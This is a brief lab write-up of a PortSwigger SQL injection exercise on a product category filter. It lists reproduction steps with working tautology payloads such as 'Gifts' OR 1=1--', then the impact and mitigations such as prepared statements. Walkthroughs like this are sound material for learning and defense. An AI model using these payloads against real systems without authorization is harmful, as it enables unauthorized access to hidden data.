# SQL Injection – Bypass Category Filter

# Vulnerability Overview
The web app has a SQL Injection flaw in the category parameter. It allows altering the backend SQL query logic.
# Reproduction Steps
### Lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

### 1. Open endpoint:
  /filter?category=Gifts
### 2. Test with a quote:
  category=Gifts' → throws SQL error (injection confirmed)
### 3. Break the query using comment:
  category=Gifts'--
### 4. Use boolean condition to dump all results:
  category=Gifts' OR 1=1--
### 5. Payload variant:
  '+or+1=1--
## Impact
An attacker can ignore filtering logic and access all product records, which may include hidden or sensitive data.
## Tools
###  Burp Suite (Proxy interception)
###  Web browser

## Fix / Mitigation
### Use parameterized queries (prepared statements)
### Validate and sanitize user input
### Avoid dynamic SQL concatenation
